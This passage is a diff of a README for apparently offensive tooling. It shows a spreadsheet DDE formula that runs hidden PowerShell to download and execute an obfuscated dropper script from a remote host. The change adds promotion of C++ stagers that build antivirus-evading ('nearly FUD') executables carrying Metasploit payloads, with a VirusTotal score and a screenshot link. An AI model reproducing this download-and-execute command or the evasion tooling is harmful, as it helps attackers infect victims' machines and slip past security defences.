@@ -56,5 +56,8 @@ For my purpose i finally used the following cell formula (taken from [https://bl
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
 ```  
   
-Also find the .cpp **stager_exe_{x86/x64}.cpp** in order to generate *nearly* FUD exe embedding msf payloads (at 6th of Jan. 2019 -> Score of 1/68 on VT).  
+Also find the .cpp **stager_exe_{x86/x64}.cpp** in order to generate *nearly* FUD exe embedding msf payloads (at **6th of Jan. 2019** -> Score of **1/68 on VT**):  
+
+![https://phackt.com/public/images/stager/stager4.png](https://phackt.com/public/images/stager/stager4.png)  
+
 Cheers,
